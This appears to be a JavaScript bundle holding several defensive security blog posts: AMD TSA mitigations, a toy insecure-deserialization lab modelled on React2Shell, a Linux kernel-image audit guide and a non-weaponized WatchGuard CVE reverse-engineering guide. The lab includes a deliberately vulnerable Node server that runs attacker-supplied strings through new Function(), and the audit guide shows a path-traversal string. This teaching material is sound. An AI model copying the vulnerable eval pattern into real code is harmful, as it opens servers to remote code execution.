<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,IS=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,DS=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,US=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
